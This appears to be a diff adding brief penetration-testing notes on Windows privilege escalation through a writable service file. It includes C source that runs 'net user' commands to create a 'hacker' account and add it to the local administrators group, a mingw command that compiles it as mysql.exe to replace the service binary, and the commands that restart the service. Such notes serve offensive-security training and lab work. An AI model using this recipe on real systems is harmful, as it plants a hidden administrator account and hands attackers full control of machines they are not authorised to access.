@@ -1,0 +1,15 @@
+1. Writable Service File (winpeas)
+2. Restart service or restart host
+
+#include <stdlib.h>
+int main ()
+{
+int i;
+i = system ("net user hacker hacker123! /add");
+i = system ("net localgroup administrators hacker /add");
+return 0; }
+
+x86_64-w64-mingw32-gcc adduser.c -o mysql.exe
+
+net stop mysql
+net start mysql
